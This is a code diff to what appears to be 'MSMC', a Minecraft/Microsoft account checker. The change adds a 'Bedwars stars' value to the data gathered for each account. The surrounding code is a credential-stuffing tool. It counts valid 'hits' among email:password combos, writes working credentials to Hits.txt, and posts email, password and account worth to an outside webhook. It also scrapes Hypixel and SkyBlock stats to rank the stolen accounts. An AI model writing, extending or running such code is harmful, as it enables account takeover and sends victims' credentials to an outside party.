@@ -27,7 +27,7 @@ hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries = 0,0,0,0,0
 urllib3.disable_warnings()
 
 class Capture:
-    def notify(email, password, name, hypixel, level, firstlogin, lastlogin, cape, capes, access, sbcoins):
+    def notify(email, password, name, hypixel, level, firstlogin, lastlogin, cape, capes, access, sbcoins, bwstars):
         global errors
         try:
             payload = {
@@ -42,7 +42,8 @@ class Capture:
                     .replace("<ofcape>", cape)
                     .replace("<capes>", capes)
                     .replace("<access>", access)
-                    .replace("<skyblockcoins>", sbcoins),
+                    .replace("<skyblockcoins>", sbcoins)
+                    .replace("<bedwarsstars>", bwstars),
                 "username": "MSMC"
             }
             requests.post(webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
@@ -56,6 +57,7 @@ class Capture:
             ofirstlogin = None
             olastlogin = None
             osbcoins = None
+            obwstars = None
             tx = requests.get('https://plancke.io/hypixel/player/stats/'+name, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
             try: oname = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
             except: _=''
@@ -65,11 +67,13 @@ class Capture:
             except: _=''
             try: olastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
             except: _=''
+            try: obwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
+            except: _=''
             try:
                 req = requests.get("https://sky.shiiyu.moe/stats/"+name, verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
                 osbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
             except: errors+=1
-            return oname, olevel, ofirstlogin, olastlogin, osbcoins
+            return oname, olevel, ofirstlogin, olastlogin, osbcoins, obwstars
         except: errors+=1
 
     def optifine(name):
@@ -92,7 +96,7 @@ class Capture:
         if screen == "'2'": print(Fore.GREEN+f"Hit: {mc} | {email}:{password}")
         hits+=1
         with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
-        oname, olevel, ofirstlogin, olastlogin, osbcoins = Capture.hypixel(mc)
+        oname, olevel, ofirstlogin, olastlogin, osbcoins, obwstars = Capture.hypixel(mc)
         cape = Capture.optifine(mc)
         access = "SFA"
         if Capture.full_access(email, password): 
@@ -115,11 +119,12 @@ Level: {olevel}
 First Login: {ofirstlogin}
 Last Login: {olastlogin}
 Skyblock Coins: {osbcoins}
+Bedwars Stars: {obwstars}
 Optifine Cape: {cape}
 MC Capes: {capes}
 Access: {access}
 =======================\n''')
-        Capture.notify(email, password, mc, oname, olevel, ofirstlogin, olastlogin, cape, capes, access, osbcoins)
+        Capture.notify(email, password, mc, oname, olevel, ofirstlogin, olastlogin, cape, capes, access, osbcoins, obwstars)
 
 def get_urlPost_sFTTag(session):
     r = session.get(sFTTag_url, timeout=15)
@@ -412,7 +417,8 @@ Last Login: <lastlogin>
 Optifine Cape: <ofcape>
 MC Capes: <capes>
 Access: <access>
-Skyblock Coins: <skyblockcoins>'''}
+Skyblock Coins: <skyblockcoins>
+Bedwars Stars: <bedwarsstars>'''}
         with open('config.ini', 'w') as configfile:
             config.write(configfile)
     read_file = configparser.ConfigParser()
